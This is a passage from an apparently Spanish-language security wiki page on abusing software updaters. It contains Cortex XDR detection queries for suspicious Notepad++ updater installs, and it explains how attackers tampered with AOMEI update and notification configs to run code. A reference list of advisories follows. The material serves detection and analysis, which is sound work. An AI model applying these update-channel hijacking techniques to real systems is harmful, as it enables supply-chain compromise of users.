| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> inicia un instalador que no es de Notepad++</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

Estos patrones se aplican a cualquier updater que acepte manifiestos sin firmar o no verifique los firmantes de los instaladores: secuestro de red + instalador malicioso + sideloading firmado por el atacante permiten la ejecución remota de código bajo la apariencia de actualizaciones «confiables».

### La configuración de notificaciones como segundo disparador de actualizaciones

Un updater puede usar configuraciones remotas separadas para **preparar contenido y activar su ejecución**. Esto requiere controlar las configuraciones o sus respuestas; los informes no identifican cómo se obtuvo acceso al origen. En el caso de AOMEI, `down_html.ini` seleccionaba una URL de archivo, una versión (`thrid`) y un MD5 (`Val`); el atacante aumentó la versión y cambió la URL y el checksum correspondiente. Este es el [fallo del límite de confianza de los metadatos](#2-hijacking-the-update-channel-to-run-code-as-system) explicado arriba. La ruta de ejecución adicional utilizaba `Notifycfg.ini`: indicaba a `ABNotify.exe` que cargara un `upgrade-now.html` extraído mediante una URL local `file:///` en un WebView. La página navegaba automáticamente a un ejecutable hermano, que el WebView entregaba al shell del sistema. El proceso hijo heredaba los privilegios del notificador; esto no lo elevaba inherentemente a SYSTEM.<sup>[[17]](#references)[[18]](#references)</sup>

Google también informó de un `Notifycfg.ini` manipulado con más de 35.000 secciones ficticias repetidas que eludían la comprobación normal de versiones del cliente. El informe no demuestra una vulnerabilidad general que permita eludir el analizador. El atacante restauró los archivos remotos después de intervalos de cinco a diez minutos, por lo que solo los clientes que consultaban durante esos intervalos recibían la configuración modificada. Este canal de notificaciones también incluía un señuelo distinto de [coerción WebDAV/NTLM](../ntlm/places-to-steal-ntlm-creds.md#remote-notification-uris-for-webdav-ntlm-coercion) que no requería ejecutar el archivo.<sup>[[18]](#references)</sup>

---
## References
- [1] [Aviso de seguridad: Netskope Client para Windows: escalada local de privilegios mediante un servidor fraudulento (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Aviso de seguridad de Netskope NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – plugin de Netskope](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – cliente/exploit IPC de Netskope](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – Explotación de ASUS DriverHub, MSI Center, Acer Control Centre y Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Escalada local de privilegios mediante archivos modificables en Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Escalada de privilegios en el agente de Windows](https://checkmk.com/werk/16361)
- [10] [Pruebas de concepto de sensepost/bloatware-pwn](https://github.com/sensepost/bloatware-pwn)
- [11] [PipeViewer de CyberArk](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Actores de un estado-nación explotan la cadena de suministro de Notepad++](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – actualización sobre el incidente de infraestructura secuestrada](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Cómo eludir la corrección de CVE-2025-0309 en Netskope Client para Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Descubrimiento de vulnerabilidades de escalada de privilegios en Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
- [16] [Quarkslab – MyReport Updater: de gRPC a SYSTEM](https://blog.quarkslab.com/myreport-updater-from-grpc-to-system.html)
- [17] [ManageEngine Threat Analysis Lab – Compromiso de la cadena de suministro de AOMEI Backupper](https://www.manageengine.com/threat-analysis-lab/aomei-backupper-supply-chain-compromise.html)
- [18] [Google Threat Intelligence Group y Mandiant – Investigación de la manipulación efímera de la cadena de suministro](https://cloud.google.com/blog/topics/threat-intelligence/investigating-ephemeral-supply-chain-tampering)
